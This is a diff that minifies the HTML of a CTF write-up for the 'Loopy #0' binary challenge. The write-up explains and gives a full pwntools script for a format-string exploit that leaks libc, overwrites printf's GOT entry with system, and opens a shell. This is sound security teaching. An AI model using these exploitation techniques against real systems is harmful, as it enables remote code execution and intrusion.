@@ -1,134 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-<meta content="nactf 2019 - Loopy #0" property="og:title"/>
-<meta content="article" property="og:type"/>
-<meta content="2019-09-22T20:39:04.285Z" property="og:published_time"/>
-<meta content="2019-11-24T03:53:01.555Z" property="og:modified_time"/>
-<meta content="Srikavin Ramkumar" property="og:author"/>
-<meta content="ctf-writeups" property="og:section"/>
-<meta content="nactf2019" property="og:tag"/>
-<meta content="binary-exploitation" property="og:tag"/>
-<meta content="pwntools" property="og:tag"/>
-<meta content="format-string" property="og:tag"/>
-<meta content="return-oriented-programming" property="og:tag"/>
-<meta content="/posts/nactf-2019-loopy-0/" property="og:url"/>
-
-    <title>nactf 2019 - Loopy #0 - srikavin.me</title>
-    <link rel="stylesheet" href="/bundle.css">
-</head>
-
-<body>
-<nav>
-    <div class="nav-left">
-        <span>
-            <a href="https://srikavin.me" class="name">Srikavin Ramkumar</a>
-        </span>
-        <span>
-            <a href="/posts" class="nav-link">Posts</a>
-        </span>
-        <span>
-            <a class="nav-link" href="/tags">Tags</a>
-        </span>
-    </div>
-</nav>
-<section class="section">
-    <div class="container">
-        
-
-<div class="blog-container">
-    
-
-
-<div class="blog-header">
-    <h1 class="title">
-        
-        nactf 2019 - Loopy #0
-        
-    </h1>
-    <div class="subtitle">
-                    <span>Posted on
-                        <span class="date" title="Created: 2019-09-22T20:39:04.285Z&#10;Updated: 2019-11-24T03:53:01.555Z">September 22, 2019*
-                        </span>
-
-                        in ctf-writeups
-                        
-                </span>
-    </div>
-    <div class="tags">
-        
-        
-        <a href="&#x2F;tags&#x2F;nactf2019&#x2F;"><span class="tag minimal interactive">nactf2019</span></a>
-        
-        
-        <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="tag minimal interactive">binary-exploitation</span></a>
-        
-        
-        <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="tag minimal interactive">pwntools</span></a>
-        
-        
-        <a href="&#x2F;tags&#x2F;format-string&#x2F;"><span class="tag minimal interactive">format-string</span></a>
-        
-        
-        <a href="&#x2F;tags&#x2F;return-oriented-programming&#x2F;"><span class="tag minimal interactive">return-oriented-programming</span></a>
-        
-    </div>
-</div>
-
-
-<div class="blog-content light">
-    <div class="blog-scrollspy">
-        <h1 class="scrollspy-label">Table of Contents</h1>
-        <ul>
-            
-            <li>
-                <a data-target="challenge" href="#challenge">Challenge</a>
-                
-            </li>
-            
-            <li>
-                <a data-target="solution" href="#solution">Solution</a>
-                
-                <ul>
-                    
-                    <li>
-                        <a data-target="leaking-libc" href="#leaking-libc">Leaking libc</a>
-                        
-                    </li>
-                    
-                    <li>
-                        <a data-target="looping" href="#looping">Looping</a>
-                        
-                    </li>
-                    
-                    <li>
-                        <a data-target="overwriting-a-got-entry" href="#overwriting-a-got-entry">Overwriting a GOT Entry</a>
-                        
-                    </li>
-                    
-                </ul>
-                
-            </li>
-            
-            <li>
-                <a data-target="full-script" href="#full-script">Full Script</a>
-                
-            </li>
-            
-        </ul>
-    </div>
-
-    <h1 id="challenge">Challenge</h1>
-<blockquote>
-<p>This program is quite short, but has got <code>printf</code> and <code>gets</code> in it! This shouldn't be too hard, right?</p>
-<p>Connect at <code>nc shell.2019.nactf.com 31283</code></p>
-</blockquote>
-<p>We are given the libc used, the binary, and the source code.</p>
-<pre style="background-color:#ffffff;">
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="nactf 2019 - Loopy #0" property="og:title"><meta content="article" property="og:type"><meta content="2019-09-22T20:39:04.285Z" property="og:published_time"><meta content="2019-11-24T03:53:01.555Z" property="og:modified_time"><meta content="Srikavin Ramkumar" property="og:author"><meta content="ctf-writeups" property="og:section"><meta content="nactf2019" property="og:tag"><meta content="binary-exploitation" property="og:tag"><meta content="pwntools" property="og:tag"><meta content="format-string" property="og:tag"><meta content="return-oriented-programming" property="og:tag"><meta content="/posts/nactf-2019-loopy-0/" property="og:url"><title>nactf 2019 - Loopy #0 - srikavin.me</title><link href="/favicon.png" rel="icon"><link href="/bundle.css" rel="stylesheet"></head><body><nav><div class="nav-left"><span><a href="https://srikavin.me" class="name">Srikavin Ramkumar</a> </span><span><a href="/posts" class="nav-link">Posts</a> </span><span><a href="/tags" class="nav-link">Tags</a></span></div></nav><section class="section"><div class="container"><div class="blog-container"><div class="blog-header"><h1 class="title">nactf 2019 - Loopy #0</h1><div class="subtitle"><span>Posted on <span class="date" title="Created: 2019-09-22T20:39:04.285Z&#10;Updated: 2019-11-24T03:53:01.555Z">September 22, 2019* </span>in ctf-writeups</span></div><div class="tags"><a href="&#x2F;tags&#x2F;nactf2019&#x2F;"><span class="interactive minimal tag">nactf2019</span></a> <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="interactive minimal tag">binary-exploitation</span></a> <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="interactive minimal tag">pwntools</span></a> <a href="&#x2F;tags&#x2F;format-string&#x2F;"><span class="interactive minimal tag">format-string</span></a> <a href="&#x2F;tags&#x2F;return-oriented-programming&#x2F;"><span class="interactive minimal tag">return-oriented-programming</span></a></div></div><div class="blog-content light"><div class="blog-scrollspy"><h1 class="scrollspy-label">Table of Contents</h1><ul><li><a href="#challenge" data-target="challenge">Challenge</a></li><li><a href="#solution" data-target="solution">Solution</a><ul><li><a href="#leaking-libc" data-target="leaking-libc">Leaking libc</a></li><li><a href="#looping" data-target="looping">Looping</a></li><li><a href="#overwriting-a-got-entry" data-target="overwriting-a-got-entry">Overwriting a GOT Entry</a></li></ul></li><li><a href="#full-script" data-target="full-script">Full Script</a></li></ul></div><h1 id="challenge">Challenge</h1><blockquote><p>This program is quite short, but has got <code>printf</code> and <code>gets</code> in it! This shouldn't be too hard, right?</p><p>Connect at <code>nc shell.2019.nactf.com 31283</code></p></blockquote><p>We are given the libc used, the binary, and the source code.</p><pre style="background-color:#ffffff;">
 <code><span style="font-weight:bold;color:#a71d5d;">#include </span><span style="color:#183691;">&lt;stdio.h&gt;
 
 </span><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">vuln</span><span style="color:#323232;">()
@@ -149,36 +19,17 @@
 
 	</span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
 }
-</span></code></pre><span id="continue-reading"></span><h1 id="solution">Solution</h1>
-<p>Because there is no win function like in the previous challenges, this requires us to call <code>system('/bin/sh')</code>. To do 
-this, we need to leak the base address that <code>libc</code> is loaded at, and then add the offset to <code>system</code> before jumping to it.</p>
-<h2 id="leaking-libc">Leaking libc</h2>
-<p>To leak <code>libc</code>, we can use the format string vulnerability to read from the GOT. By trial and error, we see that the 
-stack offset to <code>buf</code> with <code>printf</code> is 4: </p>
-<p><img src="/posts/nactf-2019-loopy-0/5d87da366e58ed23d8620866.png" alt="" /></p>
-<p>So, we can use <code>%4$s</code> to read the fourth value on the stack as a string. Since we control this value, we can read 
-arbitrary addresses.</p>
-<p>To read the value of <code>puts</code> in the GOT (address is <code>0x804c010</code>), we can do the following:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><span id="continue-reading"></span><h1 id="solution">Solution</h1><p>Because there is no win function like in the previous challenges, this requires us to call <code>system('/bin/sh')</code>. To do this, we need to leak the base address that <code>libc</code> is loaded at, and then add the offset to <code>system</code> before jumping to it.</p><h2 id="leaking-libc">Leaking libc</h2><p>To leak <code>libc</code>, we can use the format string vulnerability to read from the GOT. By trial and error, we see that the stack offset to <code>buf</code> with <code>printf</code> is 4:</p><p><img alt="" src="/posts/nactf-2019-loopy-0/5d87da366e58ed23d8620866.png"></p><p>So, we can use <code>%4$s</code> to read the fourth value on the stack as a string. Since we control this value, we can read arbitrary addresses.</p><p>To read the value of <code>puts</code> in the GOT (address is <code>0x804c010</code>), we can do the following:</p><pre style="background-color:#ffffff;">
 <code><span style="color:#323232;">payload1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">p32(</span><span style="color:#0086b3;">0x804c010</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#183691;">&quot;%4$s&quot;
-</span></code></pre>
-<p>This will give us the value that is stored at <code>0x804c010</code> which is the address of puts in memory. From this, we can 
-calculate the address of <code>system</code>:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><p>This will give us the value that is stored at <code>0x804c010</code> which is the address of puts in memory. From this, we can calculate the address of <code>system</code>:</p><pre style="background-color:#ffffff;">
 <code><span style="color:#0086b3;">GETS_ADDR </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">u32(r.recvn(</span><span style="color:#0086b3;">4</span><span style="color:#323232;">))
 </span><span style="color:#0086b3;">LIBC_BASE </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">GETS_ADDR </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#323232;">libc.symbols[</span><span style="color:#183691;">&#39;gets&#39;</span><span style="color:#323232;">]
 </span><span style="color:#0086b3;">SYSTEM_ADDR </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">LIBC_BASE </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">]
-</span></code></pre><h2 id="looping">Looping</h2>
-<p>However, we still need <code>printf</code> to overwrite a GOT entry. To keep looping, we can overflow <code>buf</code> and overwrite the 
-return pointer:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><h2 id="looping">Looping</h2><p>However, we still need <code>printf</code> to overwrite a GOT entry. To keep looping, we can overflow <code>buf</code> and overwrite the return pointer:</p><pre style="background-color:#ffffff;">
 <code><span style="color:#323232;">payload1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">p32(</span><span style="color:#0086b3;">0x804c010</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#183691;">&quot;%4$s&quot;
 </span><span style="color:#323232;">payload2 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;main&#39;</span><span style="color:#323232;">])</span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#0086b3;">4
 </span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">payload1.ljust(</span><span style="color:#0086b3;">64</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">payload2
-</span></code></pre><h2 id="overwriting-a-got-entry">Overwriting a GOT Entry</h2>
-<p>I chose to overwrite the GOT entry of <code>printf</code> because it is passed <code>buf</code> as its only argument. To do this, we can use 
-the <code>%hn</code> format string to overwrite 2 bytes at a time:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><h2 id="overwriting-a-got-entry">Overwriting a GOT Entry</h2><p>I chose to overwrite the GOT entry of <code>printf</code> because it is passed <code>buf</code> as its only argument. To do this, we can use the <code>%hn</code> format string to overwrite 2 bytes at a time:</p><pre style="background-color:#ffffff;">
 <code><span style="color:#0086b3;">GOT_PRINTF </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">elf.got[</span><span style="color:#183691;">&#39;printf&#39;</span><span style="color:#323232;">]
 </span><span style="color:#0086b3;">GOT_PRINTF_LO </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">GOT_PRINTF
 GOT_PRINTF_HI </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">GOT_PRINTF </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">0x2
@@ -202,8 +53,7 @@ pad1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="
 </span><span style="color:#323232;">payload1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">pad2 </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#183691;">&quot;%21$hn&quot; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">pad1 </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#183691;">&quot;%20$hn;sh&quot;
 </span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">payload1.ljust(</span><span style="color:#0086b3;">64</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">p32(</span><span style="color:#0086b3;">GOT_PRINTF_HI</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+  </span><span style="color:#323232;">p32(</span><span style="color:#0086b3;">GOT_PRINTF_LO</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">payload2
 r.sendline(payload)
-</span></code></pre><h1 id="full-script">Full Script</h1>
-<pre style="background-color:#ffffff;">
+</span></code></pre><h1 id="full-script">Full Script</h1><pre style="background-color:#ffffff;">
 <code><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*
 
 </span><span style="color:#323232;">elf </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./loopy-0&#39;</span><span style="color:#323232;">)
@@ -252,27 +102,4 @@ pad1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="
 r.sendline(payload)
 
 r.interactive()
-</span></code></pre>
-</div>
-
-
-</div>
-
-<script src="https://utteranc.es/client.js"
-        repo="srikavin/blog"
-        issue-term="url"
-        label="💬comments"
-        theme="github-light"
-        crossorigin="anonymous"
-        async>
-</script>
-
-    </div>
-</section>
-
-<script src="/bundle.js"></script>
- 
-
-</body>
-
-</html>
+</span></code></pre></div></div><script src="https://utteranc.es/client.js" async crossorigin="anonymous" issue-term="url" label="💬comments" repo="srikavin/blog" theme="github-light"></script></div></section><script src="/bundle.js"></script></body></html>
